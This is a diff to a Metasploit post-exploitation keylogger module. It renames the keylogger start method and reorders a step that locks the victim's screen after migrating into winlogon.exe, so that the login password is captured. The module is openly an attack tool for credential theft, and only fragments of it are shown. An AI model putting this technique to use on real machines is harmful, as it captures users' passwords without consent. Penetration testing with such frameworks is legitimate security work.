@@ -62,7 +62,9 @@ class MetasploitModule < Msf::Post
       end
     end
 
-    if startkeylogger
+    lock_screen if datastore['LOCKSCREEN'] && get_process_name == "winlogon.exe"
+
+    if start_keylogger
       @logfile = set_log
       keycap
     end
@@ -139,9 +141,7 @@ class MetasploitModule < Msf::Post
       if is_uac_enabled? and not is_admin?
         print_error("UAC is enabled on this host! Winlogon migration will be blocked. Using Explorer instead.")
       else
-        success = migrate(get_pid("winlogon.exe"), "winlogon.exe", session.sys.process.getpid)
-        lock_screen if datastore['LOCKSCREEN'] && success
-        return success
+        return migrate(get_pid("winlogon.exe"), "winlogon.exe", session.sys.process.getpid)
       end
     end
 
@@ -229,7 +229,7 @@ class MetasploitModule < Msf::Post
   #
   # @return [TrueClass] keylogger started successfully
   # @return [FalseClass] keylogger failed to start
-  def startkeylogger
+  def start_keylogger
     session.ui.keyscan_stop rescue nil #Stop keyscan if it was already running for some reason.
     begin
       print_status("Starting the keylog recorder...")
